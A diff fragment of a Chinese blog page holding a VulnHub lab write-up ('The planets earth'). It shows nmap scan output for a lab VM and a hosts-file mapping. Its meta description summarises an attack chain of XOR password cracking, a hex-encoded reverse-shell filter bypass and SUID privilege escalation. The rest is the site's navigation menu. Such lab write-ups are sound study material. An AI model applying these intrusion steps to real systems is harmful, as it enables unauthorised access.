-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">18</span><span>|_  Potentially risky methods: TRACE
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">19</span><span>| ssl-cert: Subject: <span style=color:#79c0ff>commonName</span><span style=color:#ff7b72;font-weight:700>=</span>earth.local/stateOrProvinceName<span style=color:#ff7b72;font-weight:700>=</span>Space
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">20</span><span>| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">21</span><span>| Not valid before: 2021-10-12T23:26:31
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">22</span><span>|_Not valid after:  2031-10-10T23:26:31
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">23</span><span>|_http-server-header: Apache/2.4.51 <span style=color:#ff7b72;font-weight:700>(</span>Fedora<span style=color:#ff7b72;font-weight:700>)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">24</span><span>| tls-alpn: 
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">25</span><span>|_  http/1.1
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">26</span><span>|_ssl-date: TLS randomness does not represent time
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">27</span><span>MAC Address: 00:0C:29:47:0F:CB <span style=color:#ff7b72;font-weight:700>(</span>VMware<span style=color:#ff7b72;font-weight:700>)</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">28</span><span>Warning: OSScan results may be unreliable because we could not find at least <span style=color:#a5d6ff>1</span> open and <span style=color:#a5d6ff>1</span> closed port
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">29</span><span>Device type: general purpose|router|storage-misc
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">30</span><span>Running <span style=color:#ff7b72;font-weight:700>(</span>JUST GUESSING<span style=color:#ff7b72;font-weight:700>)</span>: Linux 4.X|5.X|6.X|2.6.X|3.X <span style=color:#ff7b72;font-weight:700>(</span>97%<span style=color:#ff7b72;font-weight:700>)</span>, MikroTik RouterOS 7.X <span style=color:#ff7b72;font-weight:700>(</span>97%<span style=color:#ff7b72;font-weight:700>)</span>, Synology DiskStation Manager 5.X <span style=color:#ff7b72;font-weight:700>(</span>88%<span style=color:#ff7b72;font-weight:700>)</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">31</span><span>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:6.0 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/a:synology:diskstation_manager:5.2
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">32</span><span>Aggressive OS guesses: Linux 4.15 - 5.19 <span style=color:#ff7b72;font-weight:700>(</span>97%<span style=color:#ff7b72;font-weight:700>)</span>, Linux 5.0 - 5.14 <span style=color:#ff7b72;font-weight:700>(</span>97%<span style=color:#ff7b72;font-weight:700>)</span>, MikroTik RouterOS 7.2 - 7.5 <span style=color:#ff7b72;font-weight:700>(</span>Linux 5.6.3<span style=color:#ff7b72;font-weight:700>)</span> <span style=color:#ff7b72;font-weight:700>(</span>97%<span style=color:#ff7b72;font-weight:700>)</span>, Linux 4.19 <span style=color:#ff7b72;font-weight:700>(</span>95%<span style=color:#ff7b72;font-weight:700>)</span>, OpenWrt 21.02 <span style=color:#ff7b72;font-weight:700>(</span>Linux 5.4<span style=color:#ff7b72;font-weight:700>)</span> <span style=color:#ff7b72;font-weight:700>(</span>95%<span style=color:#ff7b72;font-weight:700>)</span>, Linux 6.0 <span style=color:#ff7b72;font-weight:700>(</span>95%<span style=color:#ff7b72;font-weight:700>)</span>, Linux 5.4 - 5.10 <span style=color:#ff7b72;font-weight:700>(</span>91%<span style=color:#ff7b72;font-weight:700>)</span>, Linux 2.6.32 <span style=color:#ff7b72;font-weight:700>(</span>91%<span style=color:#ff7b72;font-weight:700>)</span>, Linux 2.6.32 - 3.13 <span style=color:#ff7b72;font-weight:700>(</span>91%<span style=color:#ff7b72;font-weight:700>)</span>, Linux 3.10 - 4.11 <span style=color:#ff7b72;font-weight:700>(</span>91%<span style=color:#ff7b72;font-weight:700>)</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">33</span><span>No exact OS matches <span style=color:#ff7b72>for</span> host <span style=color:#ff7b72;font-weight:700>(</span>test conditions non-ideal<span style=color:#ff7b72;font-weight:700>)</span>.
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">34</span><span>Network Distance: <span style=color:#a5d6ff>1</span> hop
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">35</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">36</span><span>TRACEROUTE
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">37</span><span>HOP RTT     ADDRESS
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">38</span><span><span style=color:#a5d6ff>1</span>   0.68 ms 192.168.174.133
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">39</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">40</span><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">41</span><span>Nmap <span style=color:#ff7b72>done</span>: <span style=color:#a5d6ff>1</span> IP address <span style=color:#ff7b72;font-weight:700>(</span><span style=color:#a5d6ff>1</span> host up<span style=color:#ff7b72;font-weight:700>)</span> scanned in 174.28 seconds</span></span></code></pre></div><p>在443/tcp端口的<code>ssl-cert</code>部分发现域名信息，说明该ip在http服务中配置了两个域名：</p><ul><li><code>earth.local</code></li><li><code>terratest.earth.local</code></li></ul><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>| ssl-cert: Subject: <span style=color:#79c0ff>commonName</span><span style=color:#ff7b72;font-weight:700>=</span>earth.local/stateOrProvinceName<span style=color:#ff7b72;font-weight:700>=</span>Space
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local</span></span></code></pre></div><p>由于这是<code>.local</code>域名，kali无法直接通过浏览器访问，需要进行本地DNS解析映射（在<code>/etc/hosts</code>文件中添加ip地址和域名）
-<code>sudo nano /etc/hosts</code>，加入192.168.174.133 earth.local terratest.earth.local</p><h2 id=12-web信息收集>1.2 Web信息收集<a class=anchor href=#12-web%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86>#</a></h2><h3 id=121-域名earthlocal>1.2.1 域名earth.local<a class=anchor href=#121-%e5%9f%9f%e5%90%8dearthlocal>#</a></h3><p>访问<code>https://earth.local</code>，发现可以发送信息，但需要密钥，还有加密的Previous Messages
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="总结#信息收集发现web服务和管理后台，利用xor加密特性破解管理员密码，成功获取用户权限并通过16位转换绕过反弹shell，通过分析SUID文件并创建触发器文件提权到root
+一、信息收集#1.1 端口信息收集#┌──(kali㉿kali)-[~] └─$ sudo nmap -A -p- 192.168.174.133 Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-12 02:51 EST Nmap scan report for 192.168.174.133 Host is up (0.00068s latency). Not shown: 65373 filtered tcp ports (no-response), 159 filtered tcp ports (admin-prohibited) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.6 (protocol 2.0) | ssh-hostkey: | 256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA) |_ 256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519) 80/tcp open http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9) |_http-title: Bad Request (400) |_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9 443/tcp open ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9) |_http-title: Test Page for the HTTP Server on Fedora | http-methods: |_ Potentially risky methods: TRACE | ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space | Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local | Not valid before: 2021-10-12T23:26:31 |_Not valid after: 2031-10-10T23:26:31 |_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9 | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time MAC Address: 00:0C:29:47:0F:CB (VMware) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|router|storage-misc Running (JUST GUESSING): Linux 4.X|5.X|6.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%), Synology DiskStation Manager 5.X (88%) OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:6.0 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/a:synology:diskstation_manager:5.2 Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 4.19 (95%), OpenWrt 21.02 (Linux 5.4) (95%), Linux 6.0 (95%), Linux 5.4 - 5.10 (91%), Linux 2.6.32 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%) No exact OS matches for host (test conditions non-ideal). Network Distance: 1 hop TRACEROUTE HOP RTT ADDRESS 1 0.68 ms 192.168.174.133 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 174.28 seconds在443/tcp端口的ssl-cert部分发现域名信息，说明该ip在http服务中配置了两个域名：
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/cybersecurity/vulnhub/easy/vulnhub-The-planets_earth/">
+  <meta property="og:site_name" content="vnccer">
+  <meta property="og:title" content="The planets earth">
+  <meta property="og:description" content="总结#信息收集发现web服务和管理后台，利用xor加密特性破解管理员密码，成功获取用户权限并通过16位转换绕过反弹shell，通过分析SUID文件并创建触发器文件提权到root
+一、信息收集#1.1 端口信息收集#┌──(kali㉿kali)-[~] └─$ sudo nmap -A -p- 192.168.174.133 Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-12 02:51 EST Nmap scan report for 192.168.174.133 Host is up (0.00068s latency). Not shown: 65373 filtered tcp ports (no-response), 159 filtered tcp ports (admin-prohibited) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.6 (protocol 2.0) | ssh-hostkey: | 256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA) |_ 256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519) 80/tcp open http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9) |_http-title: Bad Request (400) |_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9 443/tcp open ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9) |_http-title: Test Page for the HTTP Server on Fedora | http-methods: |_ Potentially risky methods: TRACE | ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space | Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local | Not valid before: 2021-10-12T23:26:31 |_Not valid after: 2031-10-10T23:26:31 |_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9 | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time MAC Address: 00:0C:29:47:0F:CB (VMware) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|router|storage-misc Running (JUST GUESSING): Linux 4.X|5.X|6.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%), Synology DiskStation Manager 5.X (88%) OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:6.0 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/a:synology:diskstation_manager:5.2 Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 4.19 (95%), OpenWrt 21.02 (Linux 5.4) (95%), Linux 6.0 (95%), Linux 5.4 - 5.10 (91%), Linux 2.6.32 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%) No exact OS matches for host (test conditions non-ideal). Network Distance: 1 hop TRACEROUTE HOP RTT ADDRESS 1 0.68 ms 192.168.174.133 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 174.28 seconds在443/tcp端口的ssl-cert部分发现域名信息，说明该ip在http服务中配置了两个域名：">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+    <meta property="article:published_time" content="2026-03-11T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-03-11T22:27:33+08:00">
+    <meta property="article:tag" content="XOR脚本">
+    <meta property="article:tag" content="命令注入">
+    <meta property="article:tag" content="绕过">
+    <meta property="article:tag" content="SUID提权">
+    <meta property="article:tag" content="逆向分析">
+
+
+  <meta itemprop="name" content="The planets earth">
+  <meta itemprop="description" content="总结#信息收集发现web服务和管理后台，利用xor加密特性破解管理员密码，成功获取用户权限并通过16位转换绕过反弹shell，通过分析SUID文件并创建触发器文件提权到root
+一、信息收集#1.1 端口信息收集#┌──(kali㉿kali)-[~] └─$ sudo nmap -A -p- 192.168.174.133 Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-12 02:51 EST Nmap scan report for 192.168.174.133 Host is up (0.00068s latency). Not shown: 65373 filtered tcp ports (no-response), 159 filtered tcp ports (admin-prohibited) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.6 (protocol 2.0) | ssh-hostkey: | 256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA) |_ 256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519) 80/tcp open http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9) |_http-title: Bad Request (400) |_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9 443/tcp open ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9) |_http-title: Test Page for the HTTP Server on Fedora | http-methods: |_ Potentially risky methods: TRACE | ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space | Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local | Not valid before: 2021-10-12T23:26:31 |_Not valid after: 2031-10-10T23:26:31 |_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9 | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time MAC Address: 00:0C:29:47:0F:CB (VMware) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|router|storage-misc Running (JUST GUESSING): Linux 4.X|5.X|6.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%), Synology DiskStation Manager 5.X (88%) OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:6.0 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/a:synology:diskstation_manager:5.2 Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 4.19 (95%), OpenWrt 21.02 (Linux 5.4) (95%), Linux 6.0 (95%), Linux 5.4 - 5.10 (91%), Linux 2.6.32 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%) No exact OS matches for host (test conditions non-ideal). Network Distance: 1 hop TRACEROUTE HOP RTT ADDRESS 1 0.68 ms 192.168.174.133 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 174.28 seconds在443/tcp端口的ssl-cert部分发现域名信息，说明该ip在http服务中配置了两个域名：">
+  <meta itemprop="datePublished" content="2026-03-11T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2026-03-11T22:27:33+08:00">
+  <meta itemprop="wordCount" content="886">
+  <meta itemprop="keywords" content="XOR脚本,命令注入,绕过,SUID提权,逆向分析">
+
+<title>The planets earth | vnccer</title>
+<link rel="icon" href="/ak47.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/cybersecurity/vulnhub/easy/vulnhub-The-planets_earth/">
+<link rel="stylesheet" href="/book.min.736951ca3ba5472b01b559ccf11c0bd72daa52528001c9a2789c1ea4a2c2c765.css" integrity="sha256-c2lRyjulRysBtVnM8RwL1y2qUlKAAcmieJwepKLCx2U=" crossorigin="anonymous">
+
+
+  <script defer src="/fuse.min.js"></script>
+  <script defer src="/en.search.min.dbfdb659412a555a77ef5b04999942f4b716ee27fac91f83a3f7534110ecff57.js" integrity="sha256-2/22WUEqVVp371sEmZlC9LcW7if6yR&#43;Do/dTQRDs/1c=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+
+
+  
+</head>
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/flamez.png" alt="Logo" /><span>vnccer</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-8930de0c5beda9ae1324d8e974f81d1e" class="toggle" checked />
+    <label for="section-8930de0c5beda9ae1324d8e974f81d1e" class="flex">
+      <a href="/docs/cybersecurity/" class="">
+        网安</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-755697504a2fe68087c290f83d929a6c" class="toggle"  />
+    <label for="section-755697504a2fe68087c290f83d929a6c" class="flex">
+      <a role="button" class="">
+        DVWA</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/DVWA/" class="">
+      DVWA全难度</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-440df364fda34dee6eb8dbb8bf54c0be" class="toggle"  />
+    <label for="section-440df364fda34dee6eb8dbb8bf54c0be" class="flex">
+      <a role="button" class="">
+        Vulnerabilities</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnerabilities/Apache-Log4j2CVE-2021-44228%E5%A4%B1%E8%B4%A5%E5%B0%9D%E8%AF%95/" class="">
+      基于docker的log4j2（CVE-2021-44228）漏洞（失败）</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnerabilities/log4j2.8.1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="">
+      Log4j2.8.1漏洞复现</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-0a2f5b9129642a4909478fdeb2bc202e" class="toggle" checked />
+    <label for="section-0a2f5b9129642a4909478fdeb2bc202e" class="flex">
+      <a role="button" class="">
+        VULNHUB</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-503a003a1f0020ea9e857111fe72b746" class="toggle" checked />
+    <label for="section-503a003a1f0020ea9e857111fe72b746" class="flex">
+      <a role="button" class="">
+        easy</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Beelzebub_1/" class="">
+      Beelzebub: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Empire_Breakout/" class="">
+      Empire Breakout</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-ICA_1/" class="">
+      ICA: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-jangow_1.0.1/" class="">
+      jangow 1.0.1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Napping-1.0.1/" class="">
+      Napping: 1.0.1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Noob_1/" class="">
+      Noob: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-The-planets_earth/" class="active">
+      The planets earth</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-fbe66aa168d91291660fa4890e0caf96" class="toggle"  />
+    <label for="section-fbe66aa168d91291660fa4890e0caf96" class="flex">
+      <a role="button" class="">
+        medium</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/medium/vulnhub-Empire_lupinone/" class="">
+      Empire lupinone</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-44d06050e861867b08816ac7b41bc098" class="toggle"  />
+    <label for="section-44d06050e861867b08816ac7b41bc098" class="flex">
+      <a role="button" class="">
+        hard</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-6ccb82f673039402d87957a0215871d7" class="toggle"  />
+    <label for="section-6ccb82f673039402d87957a0215871d7" class="flex">
+      <a role="button" class="">
+        CTF</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-e0d169006dece34d6002b6d9d8f8c6d8" class="toggle"  />
+    <label for="section-e0d169006dece34d6002b6d9d8f8c6d8" class="flex">
+      <a role="button" class="">
+        easy</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/CTF/easy/CTF-web-low/" class="">
+      web-low</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-6ecffae0aff6917133e7910d8ae47ce6" class="toggle"  />
+    <label for="section-6ecffae0aff6917133e7910d8ae47ce6" class="flex">
+      <a role="button" class="">
+        medium</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-92481376b3688992fd4bd02f22611062" class="toggle"  />
+    <label for="section-92481376b3688992fd4bd02f22611062" class="flex">
+      <a role="button" class="">
+        hard</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c4a8d9ea3b5e6163e868446590d1d1fc" class="toggle"  />
+    <label for="section-c4a8d9ea3b5e6163e868446590d1d1fc" class="flex">
+      <a href="/docs/papers/" class="">
+        论文</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/ET-BERT/ET-BERT/" class="">
+      ET-BERT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/ET-BERT/ET-BERT%E5%A4%8D%E7%8E%B0/" class="">
+      ET-BERT复现</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
